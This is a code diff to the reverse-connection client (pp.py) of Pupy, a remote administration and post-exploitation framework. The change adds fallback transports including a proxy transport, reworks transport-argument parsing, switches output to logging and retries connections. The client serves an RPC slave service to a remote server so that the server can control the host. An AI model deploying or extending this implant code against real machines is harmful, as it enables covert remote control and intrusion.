@@ -42,7 +42,7 @@ import argparse
 from network.conf import transports
 import logging
 import shlex
-#logging.getLogger().setLevel(logging.DEBUG)
+logging.getLogger().setLevel(logging.INFO)
 
 
 
@@ -107,19 +107,24 @@ def add_pseudo_pupy_module(HOST):
 		mod.get_connect_back_host=(lambda : HOST)
 		mod.pseudo=True
 
-HOST="127.0.0.1:443"
-TRANSPORT="tcp_ssl"
 def main():
-	global HOST, TRANSPORT
+	HOST="127.0.0.1:443"
+	TRANSPORTS=[("tcp_ssl",{}), ("tcp_ssl_proxy",{})]
 	if len(sys.argv)>1:
 		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
-		parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default=TRANSPORT, help="the transport to use ! (the server needs to be configured with the same transport) ")
+		parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default="tcp_ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
 		parser.add_argument('host', metavar='host:port', help='The address of the pupy server to connect to')
 		parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex for proxy transports: proxy_addr=192.168.0.1 proxy_port=8080 proxy_type=HTTP")
 		args=parser.parse_args()
 		HOST=args.host
-		TRANSPORT=args.transport
-		TRANSPORT_ARGS=args.transport_args
+		TRANSPORTS=[(args.transport, {})]
+		args_dic={}
+		for val in shlex.split(' '.join(args.transport_args)):
+			tab=val.split("=",1)
+			if len(tab)!=2:
+				exit("Error: transport arguments must be in format NAME=VALUE or 'NAME=value with spaces'")
+			args_dic[tab[0].lower()]=tab[1]
+		TRANSPORTS[0][1].update(args_dic)
 	if "windows" in platform.system().lower():
 		try:
 			import pupy
@@ -127,7 +132,7 @@ def main():
 			exec config_file in globals()
 			pupy.get_connect_back_host=(lambda: HOST)
 		except ImportError:
-			print "Warning : ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL"
+			logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
 	else:
 		add_pseudo_pupy_module(HOST)
 	
@@ -135,56 +140,65 @@ def main():
 	attempt=0
 	while True:
 		try:
-			rhost,rport=None,None
-			tab=HOST.rsplit(":",1)
-			rhost=tab[0]
-			if len(tab)==2:
-				rport=int(tab[1])
-			else:
-				rport=443
-			print "connecting to %s:%s using transport %s ..."%(rhost, rport, TRANSPORT)
-			t=transports[TRANSPORT]
-			client_args=t['client_kwargs']
-			transport_args=t['client_transport_kwargs']
-			for val in shlex.split(' '.join(TRANSPORT_ARGS)):
-				tab=val.split("=",1)
-				if len(tab)!=2:
-					exit("Error: transport arguments must be in format NAME=VALUE or 'NAME=value with spaces'")
-				if tab[0].lower() in client_args:
-					client_args[tab[0].lower()]=tab[1]
-				elif tab[0].lower() in transport_args:
-					transport_args[tab[0].lower()]=tab[1]
-				else:
-					exit("unknown transport argument : %s"%tab[0])
+			print TRANSPORTS
+			for TRANSPORT,TRANSPORT_ARGS in TRANSPORTS:
+				try:
+					rhost,rport=None,None
+					tab=HOST.rsplit(":",1)
+					rhost=tab[0]
+					if len(tab)==2:
+						rport=int(tab[1])
+					else:
+						rport=443
+					logging.info("connecting to %s:%s using transport %s ..."%(rhost, rport, TRANSPORT))
+					t=transports[TRANSPORT]
+					client_args=t['client_kwargs']
+					transport_args=t['client_transport_kwargs']
+					for val in TRANSPORT_ARGS:
+						if val.lower() in client_args:
+							client_args[val.lower()]=TRANSPORT_ARGS[val]
+						elif val.lower() in transport_args:
+							transport_args[val.lower()]=TRANSPORT_ARGS[val]
+						else:
+							logging.warning("unknown transport argument : %s"%tab[0])
 
-			print "using client options: %s"%client_args
-			print "using transports options: %s"%transport_args
+					logging.info("using client options: %s"%client_args)
+					logging.info("using transports options: %s"%transport_args)
 
-			client=t['client'](**client_args)
-			s=client.connect(rhost, rport)
-			stream = t['stream'](s, t['client_transport'], transport_args)
-			def check_timeout(event, cb, timeout=10):
-				start_time=time.time()
-				while True:
-					if time.time()-start_time>timeout:
-						if not event.is_set():
-							print "timeout occured !"
-							cb()
-						break
-					elif event.is_set():
-						break
-					time.sleep(0.5)
-			event=threading.Event()
-			t=threading.Thread(target=check_timeout, args=(event, stream.close))
-			t.daemon=True
-			t.start()
-			try:
-				conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
-			finally:
-				event.set()
-			while True:
-				attempt=0
-				conn.serve()
+					client=t['client'](**client_args)
+					s=client.connect(rhost, rport)
+					stream = t['stream'](s, t['client_transport'], transport_args)
+					def check_timeout(event, cb, timeout=10):
+						start_time=time.time()
+						while True:
+							if time.time()-start_time>timeout:
+								if not event.is_set():
+									logging.error("timeout occured !")
+									cb()
+								break
+							elif event.is_set():
+								break
+							time.sleep(0.5)
+					event=threading.Event()
+					t=threading.Thread(target=check_timeout, args=(event, stream.close))
+					t.daemon=True
+					t.start()
+					try:
+						conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
+					finally:
+						event.set()
+					while True:
+						attempt=0
+						conn.serve()
+				except KeyboardInterrupt:
+					raise
+				except EOFError:
+					raise
+				except SystemExit:
+					raise
+				except Exception as e:
+					logging.error(e)
+					
 		except EOFError:
 			print "EOF received. exiting."
 			break
@@ -195,10 +209,11 @@ def main():
 			else:
 				print "keyboard interrupt raised, restarting the connection"
 		except SystemExit as e:
-			print e
+			logging.error(e)
 			break
 		except Exception as e:
-			print e
+			logging.error(e)
+		finally:
 			time.sleep(get_next_wait(attempt))
 			attempt+=1
 
